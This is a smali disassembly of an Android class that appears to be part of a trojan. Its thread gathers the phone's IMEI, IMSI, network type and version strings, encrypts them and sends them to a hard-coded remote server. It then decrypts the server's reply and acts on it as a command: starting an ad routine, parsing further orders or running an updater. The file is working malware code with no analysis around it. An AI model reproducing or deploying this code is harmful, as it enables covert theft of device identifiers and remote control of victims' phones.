.class Lcom/xxx/yyy/qzl$1;
.super Ljava/lang/Thread;
.source "qzl.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xxx/yyy/qzl;->GG()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/xxx/yyy/qzl;


# direct methods
.method constructor <init>(Lcom/xxx/yyy/qzl;)V
    .registers 2
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    .line 44
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 11

    .prologue
    const/4 v4, 0x2

    const-string v1, "&"

    .line 46
    const-string v7, ""

    .line 52
    .local v7, im:Ljava/lang/String;
    :try_start_5
    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    iget v2, v2, Lcom/xxx/yyy/qzl;->netway:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$2(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$3(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/xxx/yyy/ddda;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_5f
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5f} :catch_db

    move-result-object v7

    .line 59
    :goto_60
    iget-object v1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://adrd.taxuan.net/index.aspx?im="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    #calls: Lcom/xxx/yyy/qzl;->GetO(Ljava/lang/String;)Ljava/lang/String;
    invoke-static {v1, v2}, Lcom/xxx/yyy/qzl;->access$5(Lcom/xxx/yyy/qzl;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 63
    .local v9, order:Ljava/lang/String;
    :try_start_75
    iget-object v1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;
    invoke-static {v1}, Lcom/xxx/yyy/qzl;->access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v9, v1}, Lcom/xxx/yyy/ddda;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_7e
    .catch Ljava/lang/Exception; {:try_start_75 .. :try_end_7e} :catch_d9

    move-result-object v9

    .line 71
    :goto_7f
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_8d

    .line 73
    const/4 v1, 0x1

    invoke-virtual {v9, v1}, Ljava/lang/String;->charAt(I)C

    move-result v1

    packed-switch v1, :pswitch_data_de

    .line 105
    :cond_8d
    :goto_8d
    return-void

    .line 78
    :pswitch_8e
    invoke-virtual {v9, v4}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    .line 81
    .local v8, mdn:Ljava/lang/String;
    goto :goto_8d

    .line 86
    .end local v8           #mdn:Ljava/lang/String;
    :pswitch_93
    new-instance v0, Lcom/xxx/yyy/adad;

    iget-object v1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;
    invoke-static {v1}, Lcom/xxx/yyy/qzl;->access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;
    invoke-static {v2}, Lcom/xxx/yyy/qzl;->access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    iget v3, v3, Lcom/xxx/yyy/qzl;->netway:I

    iget-object v4, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;
    invoke-static {v4}, Lcom/xxx/yyy/qzl;->access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v4

    iget-object v5, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;
    invoke-static {v5}, Lcom/xxx/yyy/qzl;->access$6(Lcom/xxx/yyy/qzl;)Landroid/content/Context;

    move-result-object v5

    invoke-direct/range {v0 .. v5}, Lcom/xxx/yyy/adad;-><init>(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)V

    .line 87
    .local v0, ad:Lcom/xxx/yyy/adad;
    invoke-virtual {v0}, Lcom/xxx/yyy/adad;->StartGo()V

    goto :goto_8d

    .line 93
    .end local v0           #ad:Lcom/xxx/yyy/adad;
    :pswitch_b8
    iget-object v1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-virtual {v9, v4}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    #calls: Lcom/xxx/yyy/qzl;->ParseO(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/xxx/yyy/qzl;->access$7(Lcom/xxx/yyy/qzl;Ljava/lang/String;)V

    goto :goto_8d

    .line 99
    :pswitch_c2
    new-instance v6, Lcom/xxx/yyy/UpdateHelper;

    iget-object v1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    #getter for: Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;
    invoke-static {v1}, Lcom/xxx/yyy/qzl;->access$6(Lcom/xxx/yyy/qzl;)Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    iget v2, v2, Lcom/xxx/yyy/qzl;->netway:I

    invoke-direct {v6, v1, v2}, Lcom/xxx/yyy/UpdateHelper;-><init>(Landroid/content/Context;I)V

    .line 100
    .local v6, helper:Lcom/xxx/yyy/UpdateHelper;
    invoke-virtual {v9, v4}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1}, Lcom/xxx/yyy/UpdateHelper;->Doit(Ljava/lang/String;)V

    goto :goto_8d

    .line 67
    .end local v6           #helper:Lcom/xxx/yyy/UpdateHelper;
    :catch_d9
    move-exception v1

    goto :goto_7f

    .line 54
    .end local v9           #order:Ljava/lang/String;
    :catch_db
    move-exception v1

    goto :goto_60

    .line 73
    nop

    :pswitch_data_de
    .packed-switch 0x30
        :pswitch_8e
        :pswitch_93
        :pswitch_b8
        :pswitch_c2
    .end packed-switch
.end method
